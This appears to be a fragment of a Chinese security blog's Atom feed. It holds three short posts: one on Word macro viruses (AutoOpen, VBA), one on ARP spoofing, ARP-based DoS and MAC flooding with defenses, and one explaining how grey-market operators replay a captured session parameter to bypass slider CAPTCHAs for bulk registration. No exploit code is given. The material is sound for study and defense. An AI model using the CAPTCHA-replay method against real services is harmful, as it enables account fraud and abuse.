&lt;p&gt;宏（macro），就是软件设计者为了在使用软件工作时，避免一再的重复相同的动作而设计出来的一种工具。它利用简单的语法，把常用的动作写成宏，当再工作时，就可以直接利用事先写好的宏自动运行，去完成某项特定的任务，而不必再重复相同的动作。&lt;/p&gt;

&lt;h2 id=&quot;什么是宏病毒&quot;&gt;什么是宏病毒&lt;/h2&gt;

&lt;p&gt;宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。&lt;/p&gt;

&lt;h2 id=&quot;宏病毒的特性&quot;&gt;宏病毒的特性&lt;/h2&gt;

&lt;p&gt;宏病毒具有自动执行的特性，特别是含有AutoOpen的宏，一旦用户打开含有宏的文档，其中的宏就会被执行，而用户一无所知&lt;/p&gt;

&lt;h2 id=&quot;宏语言&quot;&gt;宏语言&lt;/h2&gt;

&lt;p&gt;宏语言即VISUAL BASIC FOR APPLICATION，简称VBA。VBA可以访问许多操作系统函数并支持文档打开时自动执行宏——这使得用这种语言写计算机病毒成为可能&lt;/p&gt;

&lt;h2 id=&quot;数据文件格式&quot;&gt;数据文件格式&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;.doc—一种可以存贮云的普通文档；.docx—一种不包含宏的普通文档；&lt;/li&gt;
  &lt;li&gt;.docm——一种包含宏或启用了宏的文档；&lt;/li&gt;
  &lt;li&gt;.dotx——一种不包含宏的模板；&lt;/li&gt;
  &lt;li&gt;.dotm———种包含宏或启用了宏的模板&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;常用的宏&quot;&gt;常用的宏&lt;/h2&gt;

&lt;h2&gt;&lt;img src=&quot;/img/hong.png&quot; alt=&quot;hong&quot; /&gt;&lt;/h2&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">ARP安全</title><link href="http://localhost:4000/_posts/2020-06-15-ARP%E5%AE%89%E5%85%A8/" rel="alternate" type="text/html" title="ARP安全" /><published>2020-06-15T00:00:00+08:00</published><updated>2020-06-15T00:00:00+08:00</updated><id>http://localhost:4000/_posts/ARP%E5%AE%89%E5%85%A8</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-15-ARP%E5%AE%89%E5%85%A8/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;arp协议&quot;&gt;ARP协议&lt;/h1&gt;

&lt;p&gt;ARP协议（&lt;code&gt;address resolution protocol&lt;/code&gt;）&lt;code&gt;地址解析协议&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;IP&lt;/code&gt; &lt;code&gt;--&amp;gt;&amp;gt;&lt;/code&gt;　&lt;code&gt;MAC&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ARP协议的基本功能就是通过目标设备的IP地址，来查询目标设备的mac地址。&lt;/p&gt;

&lt;p&gt;在局域网的任意一台主机中，都有一个&lt;code&gt;ARP缓存表&lt;/code&gt;，里面保存本机已知的此局域网中各主机和路由器的IP地址和MAC地址的对照关系。ARP缓存表的&lt;code&gt;生命周期是有时限的&lt;/code&gt;（一般不超过20分钟）&lt;/p&gt;

&lt;h1 id=&quot;apr攻击发现&quot;&gt;APR攻击发现&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;上网明显变慢，或者突然掉线时&lt;/strong&gt;，我们可以用&lt;code&gt;arp -a&lt;/code&gt;命令来检查ARP表&lt;code&gt;arp -d&lt;/code&gt;删除ARP表&lt;/li&gt;
  &lt;li&gt;ARP防火墙类软件&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;攻击方式&quot;&gt;&lt;strong&gt;攻击方式&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;简单的诈骗攻击&quot;&gt;&lt;strong&gt;简单的诈骗攻击&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这是对比多见的攻击，经过发送伪造的ARP包来诈骗路由和方针主机，让方针主机认为这是一个合法的主机，便完成了诈骗，这种诈骗多发生在同一网段内，因为路由不会把本网段的包向外转发，当然完成不一样网段的攻击也有办法，便要经过ICMP协议来告诉路由器从头挑选路由&lt;/p&gt;

&lt;h2 id=&quot;根据arp的dos&quot;&gt;&lt;strong&gt;根据ARP的DOS&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;D.O.S又称拒绝服务攻击，当大量的衔接请求被发送到一台主机时，因为主机的处理才能有限，不能为正常用户提供服务，便呈现拒绝服务。这个过程中假如运用ARP来躲藏自己，在被攻击主机的日志上就不会呈现真实的IP攻击，也不会影响到本机。&lt;/p&gt;

&lt;h2 id=&quot;mac-flooding&quot;&gt;&lt;strong&gt;MAC Flooding&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这是一个对比风险的攻击，能够溢出交流机的ARP表，使全部网络不能正常通讯。&lt;/p&gt;

&lt;h1 id=&quot;arp攻击的防护&quot;&gt;&lt;strong&gt;arp攻击的防护&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;arp-高速缓存超时设置&quot;&gt;&lt;strong&gt;ARP 高速缓存超时设置&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在ARP高速缓存中的表项一般都要设置超时值，缩短这个这个超时值能够有用的避免ARP表的溢出。&lt;/p&gt;

&lt;h2 id=&quot;ipmac访问操控--推荐使用&quot;&gt;&lt;strong&gt;IP+MAC访问操控  —–推荐使用&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;单纯依托IP或MAC来树立信赖联系是不安全，抱负的安全联系树立在IP+MAC的根底上，这也是咱们校园网上网有必要绑定IP和MAC的因素之一&lt;/p&gt;

&lt;h2 id=&quot;静态arp缓存表&quot;&gt;&lt;strong&gt;静态ARP缓存表&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;每台主机都有一个暂时寄存IP-MAC的对应表ARP攻击就经过更改这个缓存来到达诈骗的意图，运用静态的ARP来绑定正确的MAC是一个有用的办法，在命令行下运用arp -a能够检查当时的ARP缓存表。&lt;/p&gt;

&lt;h2 id=&quot;自动查询&quot;&gt;&lt;strong&gt;自动查询&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在某个正常的时间，做一个IP和MAC对应的数据库，以后定时检查当时的IP和MAC对应联系是否正常，定时检查交流机的流量列表，检查丢包率。&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">滑动验证码黑产</title><link href="http://localhost:4000/_posts/2020-06-15-%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E9%BB%91%E4%BA%A7/" rel="alternate" type="text/html" title="滑动验证码黑产" /><published>2020-06-15T00:00:00+08:00</published><updated>2020-06-15T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E9%BB%91%E4%BA%A7</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-15-%E6%BB%91%E5%8A%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E9%BB%91%E4%BA%A7/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;session参数重复校验漏洞&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;思路&quot;&gt;思路&lt;/h1&gt;

&lt;p&gt;由于每次拖动滑块后，会发送一个Request请求数据包到服务器，服务器会验证这个Request请求数据包里携带的位移参数，来判断是否是拖动滑块到了正确的缺口位置。而服务器接收的数据包有很多，除了你发送的，也还会有其他人发送的请求，所以需要一个session参数来作为标识。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;首先，触发滑动验证机制&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;接着，滑动滑块到正确缺口位置，然后抓包。分析数据包，寻找session参数。&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;每次滑动正确位移后，使用Brupsuite或者其它中间人代理工具，抓包提取数据包里的session参数，保存到本地&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;因为服务器后端默认隐含对我们本地保存的session参数有一个有效时间和有效次数，所以我们不需要再去滑动验证码，直接在session的有效期内发送Request请求数据包到服务器即可验证成功！&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;最后黑产在实际批量注册，薅羊毛或刷赞过程中，遇到触发的滑动验证码机制，只要session在有效期内，只需使用python读取本地的txt内容，调用requests库发送请求数据包，即可绕过滑动验证码&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>